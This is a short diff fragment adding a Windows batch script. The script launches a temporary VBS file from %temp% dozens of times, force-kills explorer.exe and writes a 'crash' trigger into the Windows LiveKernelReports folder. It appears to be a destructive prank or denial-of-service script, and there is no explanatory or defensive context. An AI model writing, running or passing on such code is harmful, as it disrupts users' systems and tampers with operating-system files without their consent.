+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+
+taskkill /f /im explorer.exe
+
+@echo off
+echo crash > c:\windows\livekernelreports\trigger.txt
+
+
+endlocal
